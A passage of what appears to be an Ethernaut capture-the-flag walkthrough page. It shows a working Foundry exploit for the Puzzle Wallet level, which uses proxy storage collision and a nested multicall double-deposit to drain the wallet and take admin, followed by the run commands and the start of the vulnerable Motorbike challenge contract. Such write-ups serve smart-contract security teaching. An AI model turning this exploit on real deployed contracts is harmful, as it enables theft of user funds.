</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level24.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level24Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    PuzzleProxy </span><span class="token" style="color:#569CD6">public</span><span> proxy </span><span class="token" style="color:#d4d4d4">=</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">PuzzleProxy</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x5415eC6D56a799978BdEd9166328De045f52366D</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    PuzzleWallet </span><span class="token" style="color:#569CD6">public</span><span> wallet </span><span class="token" style="color:#d4d4d4">=</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">PuzzleWallet</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x5415eC6D56a799978BdEd9166328De045f52366D</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Wallet Owner  :&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> wallet</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">owner</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Proxy Admin :&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> proxy</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">admin</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Wallet Max Balance : &quot;</span><span class="token" style="color:#d4d4d4">,</span><span> wallet</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">maxBalance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Proxy Pending Admin : &quot;</span><span class="token" style="color:#d4d4d4">,</span><span> proxy</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">pendingAdmin</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Wallet balance : &quot;</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>wallet</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>balance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        Attack attack </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        attack</span><span class="token" style="color:#d4d4d4">.</span><span>exploit</span><span class="token" style="color:#d4d4d4">{</span><span>value</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#b5cea8">0.001</span><span> ether</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Wallet Owner  :&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> wallet</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">owner</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Proxy Admin :&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> proxy</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">admin</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Wallet Max Balance : &quot;</span><span class="token" style="color:#d4d4d4">,</span><span> wallet</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">maxBalance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Proxy Pending Admin : &quot;</span><span class="token" style="color:#d4d4d4">,</span><span> proxy</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">pendingAdmin</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Wallet balance : &quot;</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>wallet</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>balance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    PuzzleProxy </span><span class="token" style="color:#569CD6">public</span><span> proxy </span><span class="token" style="color:#d4d4d4">=</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">PuzzleProxy</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x5415eC6D56a799978BdEd9166328De045f52366D</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    PuzzleWallet </span><span class="token" style="color:#569CD6">public</span><span> wallet </span><span class="token" style="color:#d4d4d4">=</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">PuzzleWallet</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x5415eC6D56a799978BdEd9166328De045f52366D</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        proxy</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">proposeNewAdmin</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        wallet</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">addToWhitelist</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#ce9178">bytes</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> _depositData </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">bytes</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        _depositData</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encodeWithSelector</span><span class="token" style="color:#d4d4d4">(</span><span>wallet</span><span class="token" style="color:#d4d4d4">.</span><span>deposit</span><span class="token" style="color:#d4d4d4">.</span><span>selector</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#ce9178">bytes</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> data </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">bytes</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">2</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        data</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> _depositData</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        data</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encodeWithSelector</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>            wallet</span><span class="token" style="color:#d4d4d4">.</span><span>multicall</span><span class="token" style="color:#d4d4d4">.</span><span>selector</span><span class="token" style="color:#d4d4d4">,</span><span>
</span>            _depositData
<span>        </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">// nested multicalling</span><span>
</span>
<span>        wallet</span><span class="token" style="color:#d4d4d4">.</span><span>multicall</span><span class="token" style="color:#d4d4d4">{</span><span>value</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#b5cea8">0.001</span><span> ether</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">(</span><span>data</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        wallet</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">execute</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">0.002</span><span> ether</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        wallet</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">setMaxBalance</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>            </span><span class="token" style="color:#ce9178">uint256</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>                </span><span class="token" style="color:#ce9178">uint160</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x2e118e720e4142E75fC79a0f57745Af650d39F94</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>            </span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#dcdcaa">receive</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level24Solution.s.sol:Level24Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Motorbike</h2>
<p><strong>Level25.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">&lt;</span><span class="token version" style="color:#b5cea8">0.7.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;openzeppelin-contracts-06/utils/Address.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Motorbike</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#6a9955">// keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">bytes32</span><span> </span><span class="token" style="color:#569CD6">internal</span><span> </span><span class="token" style="color:#569CD6">constant</span><span> _IMPLEMENTATION_SLOT </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">struct</span><span> </span><span class="token" style="color:#4ec9b0">AddressSlot</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> value</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _logic</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>Address</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">isContract</span><span class="token" style="color:#d4d4d4">(</span><span>_logic</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;ERC1967: new implementation is not a contract&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">_getAddressSlot</span><span class="token" style="color:#d4d4d4">(</span><span>_IMPLEMENTATION_SLOT</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>value </span><span class="token" style="color:#d4d4d4">=</span><span> _logic</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span> success</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> _logic</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">delegatecall</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>            abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encodeWithSignature</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;initialize()&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#6a9955">//we can able to call the initialize() again since it is a delegate call.</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>success</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Call failed&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// Delegates the current call to `implementation`.</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">_delegate</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> implementation</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">internal</span><span> virtual </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#6a9955">// solhint-disable-next-line no-inline-assembly</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">assembly</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#dcdcaa">calldatacopy</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#dcdcaa">calldatasize</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">let</span><span> result </span><span class="token" style="color:#d4d4d4">:=</span><span> </span><span class="token" style="color:#dcdcaa">delegatecall</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">gas</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> implementation</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#dcdcaa">calldatasize</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>            </span><span class="token" style="color:#dcdcaa">returndatacopy</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#dcdcaa">returndatasize</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">switch</span><span> result
</span><span>            </span><span class="token" style="color:#569CD6">case</span><span> </span><span class="token" style="color:#b5cea8">0</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> </span><span class="token" style="color:#569CD6">revert</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#dcdcaa">returndatasize</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">default</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> </span><span class="token" style="color:#569CD6">return</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#dcdcaa">returndatasize</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// Fallback function that delegates calls to the address returned by `_implementation()`.</span><span>
</span><span>    </span><span class="token" style="color:#6a9955">// Will run if no other function in the contract matches the call data</span><span>
</span><span>    fallback </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> virtual </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">_delegate</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">_getAddressSlot</span><span class="token" style="color:#d4d4d4">(</span><span>_IMPLEMENTATION_SLOT</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>value</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// Returns an `AddressSlot` with member `value` located at `slot`.</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">_getAddressSlot</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bytes32</span><span> slot</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">internal</span><span> </span><span class="token" style="color:#569CD6">pure</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>AddressSlot </span><span class="token" style="color:#569CD6">storage</span><span> r</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">assembly</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            r_slot </span><span class="token" style="color:#d4d4d4">:=</span><span> slot
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#6a9955">/*
</span><span class="token" style="color:#6a9955">*/</span><span>
</span><span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Engine</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Initializable </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#6a9955">// keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">bytes32</span><span> </span><span class="token" style="color:#569CD6">internal</span><span> </span><span class="token" style="color:#569CD6">constant</span><span> _IMPLEMENTATION_SLOT </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> upgrader</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">uint256</span><span> </span><span class="token" style="color:#569CD6">public</span><span> horsePower</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">struct</span><span> </span><span class="token" style="color:#4ec9b0">AddressSlot</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
